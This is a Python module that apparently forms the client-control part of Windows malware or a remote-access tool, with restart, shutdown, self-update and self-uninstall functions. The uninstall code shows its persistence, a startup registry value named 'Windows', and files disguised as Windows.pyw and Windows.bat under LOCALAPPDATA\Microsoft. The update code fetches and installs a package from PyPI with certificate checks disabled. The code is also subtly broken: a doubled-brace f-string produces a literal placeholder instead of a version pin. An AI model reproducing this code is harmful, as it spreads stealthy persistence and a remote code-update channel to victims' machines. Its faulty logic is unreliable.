import os
import sys
import shutil
import winreg as reg
import subprocess
from packaging import version
import http.client
import ssl
import json
import importlib
import thispackagedoesnotexist

class ClientControl:
    @staticmethod
    def restart_self():
        os.execl(sys.executable, sys.executable, *sys.argv)

    @staticmethod
    def shutdown_self():
        sys.exit()
    
    @staticmethod
    def update_self():
        def get_installed_version(package_name):
            try:
                output = subprocess.run(
                    [sys.executable, "-m", "pip", "show", package_name],
                    capture_output=True, text=True
                ).stdout
                for line in output.splitlines():
                    if line.startswith("Version: "):
                        return line.split("Version: ")[1].strip()
            except:
                return None

        def get_latest_version(package_name):
            try:
                conn = http.client.HTTPSConnection("pypi.org", context=ssl._create_unverified_context())
                conn.request("GET", f"/pypi/{package_name}/json")
                response = conn.getresponse()
                if response.status == 200:
                    data = response.read().decode("utf-8")
                    conn.close()
                    package_info = json.loads(data)
                    return package_info["info"]["version"]
                else:
                    conn.close()
            except:
                return None

        def update_or_install_package(package_name):
            installed_version = get_installed_version(package_name)
            if installed_version is None:
                return False
            latest_version = get_latest_version(package_name)
            if latest_version is None:
                return False
            package_name_with_version = f"{{package_name}}=={{latest_version}}"

            if latest_version and version.parse(installed_version) < version.parse(latest_version):
                subprocess.check_call([sys.executable, "-m", "pip", "install", "--upgrade", package_name_with_version, "--no-cache-dir"])
                importlib.reload(thispackagedoesnotexist)

        try:
            package_name = "thispackagedoesnotexist"
            update_or_install_package(package_name)
        except Exception:
            return False

    @staticmethod
    def uninstall_self():
        def remove_from_startup_registry():
            key = reg.HKEY_CURRENT_USER
            sub_key = r"Software\Microsoft\Windows\CurrentVersion\Run"
            value_name = "Windows"
            
            try:
                with reg.OpenKey(key, sub_key, 0, reg.KEY_WRITE) as registry_key:
                    reg.DeleteValue(registry_key, value_name)
            except FileNotFoundError:
                pass
            except Exception:
                pass

        def remove_files_and_folders(python_library_path, installation_file, bat_file):
            try:
                if os.path.exists(python_library_path):
                    shutil.rmtree(python_library_path)

                if os.path.exists(installation_file):
                    os.remove(installation_file)

                if os.path.exists(bat_file):
                    os.remove(bat_file)

            except Exception:
                pass

        python_library_path = os.path.join(os.environ['LOCALAPPDATA'], 'Microsoft', 'Python')
        installation_file = os.path.join(os.environ['LOCALAPPDATA'], 'Microsoft', 'Windows.pyw')
        bat_file = os.path.join(os.environ['LOCALAPPDATA'], 'Microsoft', 'Windows.bat')

        remove_from_startup_registry()
        remove_files_and_folders(python_library_path, installation_file, bat_file)
        ClientControl.shutdown_self()